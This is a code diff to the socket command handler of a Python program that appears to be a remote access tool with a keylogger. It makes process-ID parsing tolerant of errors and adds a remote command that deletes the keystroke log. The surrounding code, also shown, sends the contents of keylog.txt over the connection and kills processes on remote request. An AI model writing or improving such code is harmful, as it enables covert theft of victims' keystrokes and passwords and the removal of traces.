@@ -212,8 +212,11 @@ def connect():
                 res = res[2:]
                 ID_res = []
                 for text in res:
-                    ID_res.append(
-                        int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
+                    try:
+                        ID_res.append(
+                            int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
+                    except:
+                        pass
                 res_final = []
                 for pro in psutil.process_iter():
                     if pro.pid in ID_res:
@@ -235,8 +238,11 @@ def connect():
                 res = res[2:]
                 ID_res = []
                 for text in res:
-                    ID_res.append(
-                        int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
+                    try:
+                        ID_res.append(
+                            int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
+                    except:
+                        pass
                 ID_str = conn.recv(1024).decode("utf8")
                 ID_kill = int(ID_str)
                 if ID_kill in ID_res:
@@ -266,6 +272,8 @@ def connect():
                 content = f.read()
                 conn.sendall(bytes(content, "utf8"))
                 f.close()
+            elif encodedData == "-deletekeylogfile-":
+                os.remove("keylog.txt")
 
     except KeyboardInterrupt:
         conn.close()
